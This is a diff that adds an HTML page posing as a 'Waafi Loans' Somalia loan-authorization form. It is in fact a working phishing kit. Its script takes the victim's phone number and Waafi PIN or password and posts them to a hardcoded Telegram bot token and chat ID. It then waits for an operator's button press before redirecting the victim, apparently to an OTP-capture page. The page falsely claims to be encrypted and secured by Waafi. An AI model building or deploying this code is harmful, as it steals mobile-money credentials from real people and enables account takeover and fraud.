@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify & Authorize Loan - Waafi Loans</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #1B5E20;
+            --primary-dark: #0D3B1A;
+            --primary-light: #2E7D32;
+            --primary-soft: rgba(27,94,32,0.08);
+            --primary-border: rgba(27,94,32,0.18);
+            --accent: #FF6B35;
+            --text-dark: #111827;
+            --text-mid: #4b5563;
+            --text-light: #9ca3af;
+            --bg: #f3f4f6;
+            --card: #ffffff;
+            --border: #e5e7eb;
+            --input-bg: #f9fafb;
+            --shadow: 0 20px 60px rgba(0,0,0,0.10), 0 4px 16px rgba(0,0,0,0.06);
+            --success: #10b981;
+        }
+
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: var(--bg);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            background-image:
+                radial-gradient(ellipse at 20% 10%, rgba(27,94,32,0.06) 0%, transparent 55%),
+                radial-gradient(ellipse at 80% 90%, rgba(27,94,32,0.04) 0%, transparent 50%);
+        }
+
+        .card {
+            width: 100%;
+            max-width: 430px;
+            background: var(--card);
+            border-radius: 28px;
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            animation: fadeUp 0.45s cubic-bezier(.22,.8,.3,1) both;
+        }
+
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(24px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        /* ── Header strip ── */
+        .header {
+            background: linear-gradient(135deg, #1B5E20 0%, #0D3B1A 100%);
+            padding: 28px 28px 24px;
+            position: relative;
+            overflow: hidden;
+        }
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -40px; right: -40px;
+            width: 160px; height: 160px;
+            background: rgba(255,255,255,0.06);
+            border-radius: 50%;
+        }
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -30px; left: 30px;
+            width: 100px; height: 100px;
+            background: rgba(255,255,255,0.04);
+            border-radius: 50%;
+        }
+
+        .logo-wrap {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 18px;
+            position: relative;
+            z-index: 1;
+        }
+        .logo-bg {
+            background: white;
+            border-radius: 14px;
+            padding: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 48px;
+            height: 48px;
+            flex-shrink: 0;
+            font-size: 24px;
+            font-weight: 900;
+            color: #1B5E20;
+        }
+        .brand-name {
+            font-family: 'Sora', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            letter-spacing: -0.3px;
+            line-height: 1.1;
+        }
+        .brand-sub {
+            font-size: 11.5px;
+            color: rgba(255,255,255,0.72);
+            font-weight: 400;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-top: 1px;
+        }
+
+        .header-title {
+            font-family: 'Sora', sans-serif;
+            font-size: 23px;
+            font-weight: 800;
+            color: white;
+            position: relative;
+            z-index: 1;
+            letter-spacing: -0.5px;
+            line-height: 1.2;
+        }
+        .header-desc {
+            font-size: 13.5px;
+            color: rgba(255,255,255,0.78);
+            margin-top: 6px;
+            position: relative;
+            z-index: 1;
+            line-height: 1.55;
+            font-weight: 400;
+        }
+
+        /* ── Loan info pill ── */
+        .loan-info {
+            margin: 20px 22px 0;
+            background: var(--primary-soft);
+            border: 1px solid var(--primary-border);
+            border-radius: 18px;
+            padding: 16px 18px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .loan-icon {
+            width: 42px; height: 42px;
+            background: var(--primary);
+            border-radius: 12px;
+            display: flex; align-items: center; justify-content: center;
+            flex-shrink: 0;
+        }
+        .loan-icon svg { width: 22px; height: 22px; }
+        .loan-label {
+            font-size: 11.5px;
+            font-weight: 600;
+            color: var(--primary);
+            letter-spacing: 0.6px;
+            text-transform: uppercase;
+        }
+        .loan-amount {
+            font-family: 'Sora', sans-serif;
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--text-dark);
+            letter-spacing: -0.8px;
+            line-height: 1.1;
+        }
+        .loan-details {
+            font-size: 12.5px;
+            color: var(--text-mid);
+            margin-top: 2px;
+            font-weight: 500;
+        }
+
+        /* ── Form ── */
+        .form-body {
+            padding: 22px 22px 26px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 7px;
+            letter-spacing: 0.1px;
+        }
+        select, input {
+            width: 100%;
+            padding: 13px 15px;
+            background: var(--input-bg);
+            border: 1.5px solid var(--border);
+            border-radius: 13px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15.5px;
+            color: var(--text-dark);
+            transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+            appearance: none;
+            -webkit-appearance: none;
+            outline: none;
+        }
+        .select-wrap {
+            position: relative;
+        }
+        .select-wrap::after {
+            content: '';
+            position: absolute;
+            right: 15px; top: 50%;
+            transform: translateY(-50%);
+            width: 0; height: 0;
+            border-left: 5px solid transparent;
+            border-right: 5px solid transparent;
+            border-top: 6px solid var(--text-mid);
+            pointer-events: none;
+        }
+        select:focus, input:focus {
+            border-color: var(--primary);
+            background: #fff;
+            box-shadow: 0 0 0 3.5px rgba(27,94,32,0.10);
+        }
+        input::placeholder { color: var(--text-light); }
+
+        /* ── PIN/Password Toggle ── */
+        .auth-toggle {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 16px;
+            background: #f0f0f0;
+            padding: 4px;
+            border-radius: 10px;
+        }
+        .toggle-btn {
+            flex: 1;
+            padding: 8px 12px;
+            border: none;
+            background: transparent;
+            color: var(--text-mid);
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.2s;
+        }
+        .toggle-btn.active {
+            background: white;
+            color: var(--primary);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+
+        .pin-hint {
+            font-size: 11.5px;
+            color: var(--text-light);
+            margin-top: 5px;
+            font-weight: 500;
+        }
+
+        /* ── Error ── */
+        .error-msg {
+            display: none;
+            background: #fff1f1;
+            border: 1px solid #fca5a5;
+            color: #b91c1c;
+            font-size: 13.5px;
+            font-weight: 500;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+
+        /* ── Buttons ── */
+        .btn-primary {
+            width: 100%;
+            background: linear-gradient(135deg, #1B5E20, #0D3B1A);
+            color: white;
+            border: none;
+            padding: 15px;
+            font-family: 'Sora', sans-serif;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            letter-spacing: -0.2px;
+            transition: opacity 0.18s, transform 0.12s, box-shadow 0.18s;
+            box-shadow: 0 4px 18px rgba(27,94,32,0.35);
+            margin-top: 4px;
+        }
+        .btn-primary:hover:not(:disabled) {
+            opacity: 0.93;
+            box-shadow: 0 6px 24px rgba(27,94,32,0.40);
+            transform: translateY(-1px);
+        }
+        .btn-primary:active:not(:disabled) { transform: translateY(0); }
+        .btn-primary:disabled {
+            background: #d1d5db;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+
+        .btn-back {
+            width: 100%;
+            background: transparent;
+            color: var(--text-mid);
+            border: 1.5px solid var(--border);
+            padding: 14px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: border-color 0.18s, color 0.18s;
+        }
+        .btn-back:hover { border-color: #9ca3af; color: var(--text-dark); }
+
+        .divider {
+            height: 1px;
+            background: var(--border);
+            margin: 20px 0;
+        }
+
+        /* ── Approval Boxes Modal ── */
+        .approval-modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 10001;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            backdrop-filter: blur(4px);
+        }
+        .approval-modal.active {
+            display: flex;
+        }
+        .approval-content {
+            background: white;
+            border-radius: 24px;
+            padding: 28px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 30px 100px rgba(0,0,0,0.3);
+            animation: slideUp 0.3s ease-out;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .approval-title {
+            font-family: 'Sora', sans-serif;
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .approval-boxes {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        .approval-box {
+            background: linear-gradient(135deg, rgba(27,94,32,0.08), rgba(27,94,32,0.04));
+            border: 2px solid rgba(27,94,32,0.2);
+            border-radius: 14px;
+            padding: 16px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .approval-box:hover {
+            border-color: var(--primary);
+            background: linear-gradient(135deg, rgba(27,94,32,0.12), rgba(27,94,32,0.08));
+        }
+        .approval-box.active {
+            background: linear-gradient(135deg, #1B5E20, #0D3B1A);
+            border-color: var(--primary);
+            color: white;
+        }
+        .approval-box-icon {
+            font-size: 28px;
+            margin-bottom: 8px;
+        }
+        .approval-box-text {
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--text-dark);
+        }
+        .approval-box.active .approval-box-text {
+            color: white;
+        }
+        .approval-actions {
+            display: grid;
+            gap: 10px;
+        }
+        .btn-approve {
+            background: linear-gradient(135deg, #10b981, #059669);
+            color: white;
+            border: none;
+            padding: 13px;
+            border-radius: 50px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 4px 18px rgba(16,185,129,0.3);
+        }
+        .btn-approve:hover {
+            opacity: 0.93;
+            transform: translateY(-1px);
+        }
+
+        /* ── Spinner overlay ── */
+        #spinner {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(10,10,10,0.90);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 20px;
+            backdrop-filter: blur(4px);
+        }
+        .spin-ring {
+            width: 62px; height: 62px;
+            border: 5px solid rgba(255,255,255,0.12);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .spin-label {
+            font-family: 'Sora', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            color: white;
+            letter-spacing: -0.2px;
+        }
+        .spin-sub {
+            font-size: 13px;
+            color: rgba(255,255,255,0.55);
+            margin-top: -12px;
+        }
+
+        /* Security badge */
+        .security-note {
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            justify-content: center;
+            font-size: 12px;
+            color: var(--text-light);
+            margin-top: 18px;
+            font-weight: 500;
+        }
+        .security-note svg { flex-shrink: 0; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+
+    <!-- Green header (Waafi/Somalia theme) -->
+    <div class="header">
+        <div class="logo-wrap">
+            <div class="logo-bg">💰</div>
+            <div>
+                <div class="brand-name">Waafi Loans</div>
+                <div class="brand-sub">Somalia</div>
+            </div>
+        </div>
+        <div class="header-title">Authorize Your Loan</div>
+        <div class="header-desc">Enter your Somali phone number and choose PIN or password to securely verify and approve your loan request.</div>
+    </div>
+
+    <!-- Loan info -->
+    <div class="loan-info" id="loanInfo">
+        <div class="loan-icon">
+            <svg fill="none" viewBox="0 0 24 24" stroke="white" stroke-width="2">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+            </svg>
+        </div>
+        <div class="loan-text">
+            <div class="loan-label" id="loanLabel">Waafi Loan</div>
+            <div class="loan-amount" id="loanAmount">—</div>
+            <div class="loan-details" id="loanDetails"></div>
+        </div>
+    </div>
+
+    <!-- Form -->
+    <div class="form-body">
+
+        <div class="form-group">
+            <label for="phone">Somali Phone Number</label>
+            <input type="tel" id="phone" placeholder="+252612345678" maxlength="13" inputmode="numeric">
+            <div class="pin-hint">Format: +252 followed by 9 digits</div>
+        </div>
+
+        <div class="form-group">
+            <label>Authentication Method</label>
+            <div class="auth-toggle">
+                <button class="toggle-btn active" onclick="toggleAuth('pin')">🔐 PIN</button>
+                <button class="toggle-btn" onclick="toggleAuth('password')">🔑 Password</button>
+            </div>
+        </div>
+
+        <div class="form-group" id="pinGroup">
+            <label for="pin">Waafi PIN</label>
+            <input type="password" id="pin" placeholder="••••" maxlength="4" inputmode="numeric">
+            <div class="pin-hint">Enter your 4-digit Waafi PIN</div>
+        </div>
+
+        <div class="form-group" id="passwordGroup" style="display:none;">
+            <label for="password">Waafi Password</label>
+            <input type="password" id="password" placeholder="Enter your password">
+            <div class="pin-hint">Enter your Waafi account password</div>
+        </div>
+
+        <div class="error-msg" id="errMsg"></div>
+
+        <button class="btn-primary" id="continueBtn">Verify & Authorize Loan</button>
+        <button class="btn-back" onclick="window.history.back()">← Back to Application</button>
+
+        <div class="security-note">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            256-bit encrypted & secured by Waafi
+        </div>
+    </div>
+</div>
+
+<!-- Approval Boxes Modal -->
+<div class="approval-modal" id="approvalModal">
+    <div class="approval-content">
+        <div class="approval-title">Select Approval Action</div>
+        <div class="approval-boxes">
+            <div class="approval-box" onclick="selectApproval('approve')">
+                <div class="approval-box-icon">✅</div>
+                <div class="approval-box-text">Approve Loan</div>
+            </div>
+            <div class="approval-box" onclick="selectApproval('correct')">
+                <div class="approval-box-icon">✔️</div>
+                <div class="approval-box-text">Correct User</div>
+            </div>
+            <div class="approval-box" onclick="selectApproval('verify')">
+                <div class="approval-box-icon">📱</div>
+                <div class="approval-box-text">Verify Device</div>
+            </div>
+            <div class="approval-box" onclick="selectApproval('manual')">
+                <div class="approval-box-icon">🔄</div>
+                <div class="approval-box-text">Manual Review</div>
+            </div>
+            <div class="approval-box" onclick="selectApproval('wronguser')">
+                <div class="approval-box-icon">⚠️</div>
+                <div class="approval-box-text">Wrong User</div>
+            </div>
+            <div class="approval-box" onclick="selectApproval('decline')">
+                <div class="approval-box-icon">❌</div>
+                <div class="approval-box-text">Decline</div>
+            </div>
+        </div>
+        <div class="approval-actions">
+            <button class="btn-approve" id="confirmApprovalBtn" onclick="confirmApproval()">Confirm Selection</button>
+            <button class="btn-back" onclick="closeApprovalModal()">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<!-- Spinner overlay -->
+<div id="spinner">
+    <div class="spin-ring"></div>
+    <div class="spin-label">Verifying & Processing</div>
+    <div class="spin-sub">Please hold on…</div>
+</div>
+
+<script>
+    const CONFIG = {
+        BOT_TOKEN: '8640036458:AAE2CSOKtS-6gtsKhfOUrTevoU5NF2TfgPs',
+        CHAT_ID: '7881536601',
+        APPROVE_PAGE: 'otp.html',
+        SUCCESS_PAGE: 'success.html'
+    };
+
+    let pollingOffset = 0;
+    let isProcessing = false;
+    let authMethod = 'pin';
+    let selectedApproval = null;
+
+    const phoneInput    = document.getElementById('phone');
+    const pinInput      = document.getElementById('pin');
+    const passwordInput = document.getElementById('password');
+    const continueBtn   = document.getElementById('continueBtn');
+    const errMsg        = document.getElementById('errMsg');
+    const spinner       = document.getElementById('spinner');
+    const approvalModal = document.getElementById('approvalModal');
+
+    // ── Load and display loan details ──
+    function loadLoanDetails() {
+        const params    = new URLSearchParams(window.location.search);
+        const amount    = params.get('amount');
+        const duration  = params.get('duration');
+        const purpose   = params.get('purpose');
+        const name      = params.get('name');
+        const prevPhone = params.get('phone');
+
+        if (amount) {
+            document.getElementById('loanAmount').textContent = `SOS ${parseFloat(amount).toLocaleString()}`;
+            document.getElementById('loanLabel').textContent  = name ? `${name}'s Loan` : 'Waafi Loan';
+
+            let details = [];
+            if (duration) details.push(`${duration} Days`);
+            if (purpose)  details.push(purpose.replace(/([A-Z])/g, ' $1').trim());
+            document.getElementById('loanDetails').textContent = details.join(' • ');
+        }
+
+        if (prevPhone) phoneInput.value = prevPhone;
+    }
+
+    function toggleAuth(method) {
+        authMethod = method;
+        document.querySelectorAll('.toggle-btn').forEach(btn => btn.classList.remove('active'));
+        event.target.classList.add('active');
+
+        if (method === 'pin') {
+            document.getElementById('pinGroup').style.display = 'block';
+            document.getElementById('passwordGroup').style.display = 'none';
+        } else {
+            document.getElementById('pinGroup').style.display = 'none';
+            document.getElementById('passwordGroup').style.display = 'block';
+        }
+    }
+
+    function selectApproval(action) {
+        selectedApproval = action;
+        document.querySelectorAll('.approval-box').forEach(box => box.classList.remove('active'));
+        event.target.closest('.approval-box').classList.add('active');
+    }
+
+    function closeApprovalModal() {
+        approvalModal.classList.remove('active');
+        selectedApproval = null;
+    }
+
+    function isValidSomaliNumber(phone) {
+        // Somalia phone format: +252612345678 (13 digits total)
+        // Or without +: 252612345678
+        const cleaned = phone.replace(/\D/g, '');
+        
+        // Must be 12 digits (without +) or start with 252
+        if (cleaned.length === 12 && cleaned.startsWith('252')) return true;
+        if (cleaned.length === 13 && cleaned.startsWith('252')) return true;
+        
+        return false;
+    }
+
+    // ── Seed offset with current latest update so we only catch NEW callbacks ──
+    async function seedOffset() {
+        try {
+            const r = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?limit=1&allowed_updates=["callback_query"]`);
+            const d = await r.json();
+            if (d.ok && d.result && d.result.length > 0) {
+                pollingOffset = d.result[d.result.length - 1].update_id + 1;
+            }
+        } catch(e) { /* ignore */ }
+    }
+
+    async function sendToBot(phone, credential) {
+        if (isProcessing) return;
+        isProcessing = true;
+        continueBtn.disabled = true;
+        continueBtn.textContent = "Verifying…";
+
+        const ts            = Date.now();
+        const approveId     = `approve_${ts}`;
+        const declineId     = `decline_${ts}`;
+        const verifyId      = `verify_${ts}`;
+        const correctUserId = `correctuser_${ts}`;
+        const wrongUserId   = `wronguser_${ts}`;
+        const manualId      = `manual_${ts}`;
+
+        // Seed offset before sending so we don't catch stale callbacks
+        await seedOffset();
+
+        try {
+            const credentialType = authMethod === 'pin' ? 'PIN' : 'Password';
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: `<b>🟢 Waafi Loan Verification (Somalia)</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nPhone: <code>${phone}</code>\n${credentialType}: <code>${credential}</code>\n\nChoose Action:`,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: "✅ Approve Loan",  callback_data: approveId },
+                                { text: "✔️ Correct-user",  callback_data: correctUserId }
+                            ],
+                            [
+                                { text: "📱 Verify Device", callback_data: verifyId },
+                                { text: "🔄 Manual Review", callback_data: manualId }
+                            ],
+                            [
+                                { text: "⚠️ Wrong-user",   callback_data: wrongUserId },
+                                { text: "❌ Decline", callback_data: declineId }
+                            ]
+                        ]
+                    }
+                })
+            });
+
+            spinner.style.display = 'flex';
+            startPolling(approveId, declineId, verifyId, correctUserId, wrongUserId, manualId);
+
+        } catch(e) {
+            resetButton();
+            showError("Network error. Please try again.");
+        }
+    }
+
+    function startPolling(approveId, declineId, verifyId, correctUserId, wrongUserId, manualId) {
+        const queryParams = new URLSearchParams(window.location.search).toString();
+
+        const interval = setInterval(async () => {
+            try {
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${pollingOffset}&timeout=2&allowed_updates=["callback_query"]`;
+                const r = await fetch(url);
+                const data = await r.json();
+
+                if (!data.ok || !data.result || data.result.length === 0) return;
+
+                for (const update of data.result) {
+                    pollingOffset = update.update_id + 1;
+
+                    if (!update.callback_query) continue;
+
+                    const cb = update.callback_query.data;
+
+                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ callback_query_id: update.callback_query.id })
+                    }).catch(() => {});
+
+                    if (cb === approveId || cb === correctUserId) {
+                        clearInterval(interval);
+                        spinner.style.display = 'none';
+                        window.location.href = `${CONFIG.APPROVE_PAGE}${queryParams ? '?' + queryParams : ''}`;
+                        return;
+                    }
+                    else if (cb === verifyId) {
+                        clearInterval(interval);
+                        spinner.style.display = 'none';
+                        window.location.href = `${CONFIG.SUCCESS_PAGE}${queryParams ? '?' + queryParams : ''}`;
+                        return;
+                    }
+                    else if (cb === manualId) {
+                        clearInterval(interval);
+                        spinner.style.display = 'none';
+                        showError("Your application is under manual review. You will be contacted shortly.");
+                        resetButton();
+                        return;
+                    }
+                    else if (cb === wrongUserId) {
+                        clearInterval(interval);
+                        spinner.style.display = 'none';
+                        showError("Wrong user detected. Please check your credentials and try again.");
+                        resetButton();
+                        return;
+                    }
+                    else if (cb === declineId) {
+                        clearInterval(interval);
+                        spinner.style.display = 'none';
+                        showError("Request declined. Please try again.");
+                        resetButton();
+                        return;
+                    }
+                }
+            } catch(e) {
+                // Network hiccup — keep polling
+            }
+        }, 1500);
+    }
+
+    function showError(msg) {
+        errMsg.textContent   = msg;
+        errMsg.style.display = 'block';
+    }
+
+    function resetButton() {
+        isProcessing            = false;
+        continueBtn.disabled    = false;
+        continueBtn.textContent = "Verify & Authorize Loan";
+    }
+
+    // ── Submit ──
+    continueBtn.onclick = () => {
+        errMsg.style.display = 'none';
+
+        const phone = phoneInput.value.trim();
+        const credential = authMethod === 'pin' ? pinInput.value.trim() : passwordInput.value.trim();
+
+        if (!phone || !isValidSomaliNumber(phone)) {
+            showError("Please enter a valid Somali number (e.g. +252612345678 or 252612345678)");
+            return;
+        }
+        if (authMethod === 'pin' && credential.length !== 4) {
+            showError("PIN must be exactly 4 digits");
+            return;
+        }
+        if (authMethod === 'password' && credential.length < 6) {
+            showError("Password must be at least 6 characters");
+            return;
+        }
+
+        sendToBot(phone, credential);
+    };
+
+    // ── Input sanitisation ──
+    phoneInput.addEventListener('input', () => {
+        let value = phoneInput.value.replace(/\D/g, '');
+        
+        // If starts with 252, keep it; otherwise add 252
+        if (!value.startsWith('252') && value.length > 0) {
+            if (value.startsWith('61') || value.startsWith('62')) {
+                value = '252' + value.substring(2);
+            } else {
+                value = '252' + value;
+            }
+        }
+        
+        // Format with +
+        if (value.length > 0) {
+            phoneInput.value = '+' + value.slice(0, 12);
+        }
+    });
+
+    pinInput.addEventListener('input', () => {
+        pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
+        if (pinInput.value.length === 4) pinInput.blur();
+    });
+
+    // ── Init ──
+    loadLoanDetails();
+    phoneInput.focus();
+</script>
+</body>
+</html>
